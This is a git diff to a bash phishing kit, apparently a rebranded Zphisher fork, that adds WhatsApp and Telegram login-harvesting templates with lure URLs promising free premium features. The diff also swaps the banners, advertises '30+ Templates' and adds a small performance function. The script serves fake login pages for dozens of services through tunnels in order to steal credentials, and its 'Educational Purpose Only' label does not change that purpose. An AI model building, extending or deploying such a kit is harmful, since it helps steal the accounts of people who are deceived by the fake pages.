@@ -196,34 +196,65 @@ check_update(){
 ## Check Internet Status
 check_status() {
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
-	timeout 3s curl -fIs "https://api.github.com" > /dev/null
+	timeout 5s curl -fIs "https://api.github.com" > /dev/null
 	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
+}
+
+## Performance Optimization
+optimize_performance() {
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Optimizing Performance..."
+	
+	# Clear cache
+	rm -rf .server/.cld.log .server/.loclx > /dev/null 2>&1
+	
+	# Optimize PHP settings
+	if [[ -e ".server/www" ]]; then
+		echo "memory_limit = 256M" > .server/www/php.ini 2>/dev/null
+		echo "max_execution_time = 300" >> .server/www/php.ini 2>/dev/null
+	fi
+	
+	echo -e "${GREEN}Done${WHITE}"
 }
 
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
+		${MAGENTA}
+		${MAGENTA} ███╗   ███╗██╗   ██╗███████╗ █████╗ ███╗   ███╗██╗██╗     
+		${MAGENTA} ████╗ ████║██║   ██║╚══███╔╝██╔══██╗████╗ ████║██║██║     
+		${MAGENTA} ██╔████╔██║██║   ██║  ███╔╝ ███████║██╔████╔██║██║██║     
+		${MAGENTA} ██║╚██╔╝██║██║   ██║ ███╔╝  ██╔══██║██║╚██╔╝██║██║██║     
+		${MAGENTA} ██║ ╚═╝ ██║╚██████╔╝███████╗██║  ██║██║ ╚═╝ ██║██║███████╗
+		${MAGENTA} ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚══════╝
+		${MAGENTA}                                                    
+		${CYAN}  ════════════════════════════════════════════════════════════════
+		${CYAN}  ███████╗██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
+		${CYAN}  ██╔════╝██║  ██║██║██╔════╝██║ ██╔╝██╔════╝██╔══██╗
+		${CYAN}  ███████╗███████║██║███████╗█████╔╝ █████╗  ██████╔╝
+		${CYAN}  ╚════██║██╔══██║██║╚════██║██╔═██╗ ██╔══╝  ██╔══██╗
+		${CYAN}  ███████║██║  ██║██║███████║██║  ██╗███████╗██║  ██║
+		${CYAN}  ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+		${CYAN}  ════════════════════════════════════════════════════════════════
+		${WHITE}                    ${RED}Version : ${__version__} ${WHITE}| ${GREEN}Author : MUZAMIL${WHITE}
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by muzamil-tech (muzamil)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Advanced Phishing Tool with 30+ Templates${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Created by muzamil-tech (muzamil)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Educational Purpose Only!${WHITE}
 	EOF
 }
 
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
+		${MAGENTA}
+		${MAGENTA} ███╗   ███╗██╗   ██╗███████╗ █████╗ ███╗   ███╗██╗██╗
+		${MAGENTA} ████╗ ████║██║   ██║╚══███╔╝██╔══██╗████╗ ████║██║██║
+		${MAGENTA} ██╔████╔██║██║   ██║  ███╔╝ ███████║██╔████╔██║██║██║
+		${MAGENTA} ██║╚██╔╝██║██║   ██║ ███╔╝  ██╔══██║██║╚██╔╝██║██║██║
+		${MAGENTA} ██║ ╚═╝ ██║╚██████╔╝███████╗██║  ██║██║ ╚═╝ ██║██║███████╗
+		${MAGENTA} ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚══════╝
+		${CYAN}  ════════════════════════════════════════════════════════════════
+		${WHITE}                    ${RED}Version : ${__version__} ${WHITE}| ${GREEN}Author : MUZAMIL${WHITE}
 	EOF
 }
 
@@ -750,7 +781,8 @@ main_menu() {
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
+		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox
+		${RED}[${WHITE}36${RED}]${ORANGE} WhatsApp      ${RED}[${WHITE}37${RED}]${ORANGE} Telegram
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -891,6 +923,14 @@ main_menu() {
 			website="roblox"
 			mask='https://get-free-robux'
 			tunnel_menu;;
+		36)
+			website="whatsapp"
+			mask='https://get-whatsapp-premium-features-free'
+			tunnel_menu;;
+		37)
+			website="telegram"
+			mask='https://get-telegram-premium-features-free'
+			tunnel_menu;;
 		99)
 			about;;
 		0 | 00 )
@@ -905,6 +945,7 @@ main_menu() {
 ## Main
 kill_pid
 dependencies
+optimize_performance
 check_status
 install_cloudflared
 install_localxpose
